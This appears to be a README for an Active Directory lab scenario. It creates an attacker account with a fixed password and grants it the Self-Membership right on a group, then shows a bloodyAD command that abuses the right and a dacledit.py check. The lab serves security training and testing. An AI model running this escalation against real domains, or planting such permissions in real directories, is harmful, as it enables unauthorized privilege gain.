# acl-self-membership

User that can add itself to a group (Self-Membership). Creates `scn-acl-sm-attacker` (password `Aa1234567890!`) and the group `scn-acl-sm-group`, and gives the attacker `Ext-Self-Self-Membership` (inheritance `None`) on it.

Attack:

    bloodyAD -d <domain> -u scn-acl-sm-attacker -p 'Aa1234567890!' --host <dc ip> add groupMember scn-acl-sm-group scn-acl-sm-attacker

How to verify:

    dacledit.py -action read -principal scn-acl-sm-attacker -target scn-acl-sm-group <domain>/scn-acl-sm-attacker:'Aa1234567890!' -dc-ip <dc ip>   # shows Self-Membership

Disable deletes both objects (the ACE goes with the target).
